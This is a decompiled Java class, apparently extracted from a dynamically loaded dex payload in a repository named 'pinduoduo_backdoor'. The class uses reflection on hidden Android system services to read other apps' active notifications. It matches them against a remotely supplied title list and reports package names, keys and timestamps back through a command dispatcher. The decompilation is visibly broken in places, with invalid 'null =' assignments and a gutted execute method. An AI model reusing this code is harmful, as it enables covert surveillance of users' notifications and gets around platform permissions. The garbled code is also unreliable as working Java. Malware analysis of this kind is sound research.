package com.google.android.sd.biz_dynamic_dex.xm_ntf_info;

import android.app.Notification;
import android.content.Context;
import android.os.Build;
import android.os.IBinder;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONObject;

public class XMGetNtfInfoExecutor extends DynamicCmdExecutor {
  private static Object a(String paramString1, String paramString2) {
    try {
      Class<?> clazz = Class.forName("android.os.ServiceManager");
      Method method2 = clazz.getDeclaredMethod("getService", new Class[] { String.class });
      method2.setAccessible(true);
      null = method2.invoke(clazz, new Object[] { paramString1 });
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(paramString2);
      stringBuilder.append("$Stub");
      Method method1 = Class.forName(stringBuilder.toString()).getDeclaredMethod("asInterface", new Class[] { IBinder.class });
      return (method1 == null) ? null : method1.invoke(null, new Object[] { null });
    } catch (Exception exception) {
      return null;
    } 
  }
  
  private static JSONObject a(Context paramContext, Set<String> paramSet) {
    if (Build.VERSION.SDK_INT >= 26) {
      JSONObject jSONObject = new JSONObject();
      StatusBarNotification[] arrayOfStatusBarNotification = a(paramContext, "getActiveNotifications");
      if (arrayOfStatusBarNotification != null) {
        if (arrayOfStatusBarNotification.length == 0)
          return jSONObject; 
        int j = arrayOfStatusBarNotification.length;
        for (int i = 0; i < j; i++) {
          StatusBarNotification statusBarNotification = arrayOfStatusBarNotification[i];
          if (statusBarNotification != null) {
            Notification notification = statusBarNotification.getNotification();
            String str = notification.extras.getString("android.title");
            if (paramSet.contains(str)) {
              JSONObject jSONObject1 = new JSONObject();
              jSONObject1.put("pkg", statusBarNotification.getPackageName());
              jSONObject1.put("postTime", statusBarNotification.getPostTime());
              jSONObject1.put("key", statusBarNotification.getKey());
              jSONObject1.put("channel", notification.getChannelId());
              jSONObject.put(str, jSONObject1);
            } 
          } 
        } 
      } 
      return jSONObject;
    } 
    throw new Exception("invalid os version");
  }
  
  private static StatusBarNotification[] a(Context paramContext, String paramString) {
    try {
      null = a("notification", "android.app.INotificationManager");
      Method method = null.getClass().getDeclaredMethod(paramString, new Class[] { String.class, int.class });
      method.setAccessible(true);
      return (StatusBarNotification[])method.invoke(null, new Object[] { paramContext.getPackageName(), Integer.valueOf(100) });
    } catch (Exception exception2) {
      if (TextUtils.equals(paramString, "getActiveNotifications"))
        try {
          Object object1 = a("notification", "android.app.INotificationManager");
          method = object1.getClass().getDeclaredMethod(paramString, new Class[] { String.class });
          method.setAccessible(true);
          return (StatusBarNotification[])method.invoke(object1, new Object[] { paramContext.getPackageName() });
        } catch (Exception exception1) {
          return null;
        }  
      Object object = a("notification", "android.app.INotificationManager");
      Method method = object.getClass().getDeclaredMethod((String)method, new Class[] { String.class, int.class, boolean.class });
      method.setAccessible(true);
      return (StatusBarNotification[])method.invoke(object, new Object[] { exception1.getPackageName(), Integer.valueOf(100), Boolean.TRUE });
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject(paramString);
    CmdData cmdData = new CmdData(4008, jSONObject.optString("uuid"), "client");
    try {
      JSONArray jSONArray = jSONObject.optJSONArray("titleList");
      if (jSONArray != null && jSONArray.length() != 0) {
        int i;
        HashSet<String> hashSet = new HashSet();
        return;
      } 
      throw new Exception("invalid input");
    } finally {
      jSONObject = null;
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONObject.getMessage(), null));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\95cd95ab4d694ad8bdf49f07e3599fb3-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\xm_ntf_info\XMGetNtfInfoExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */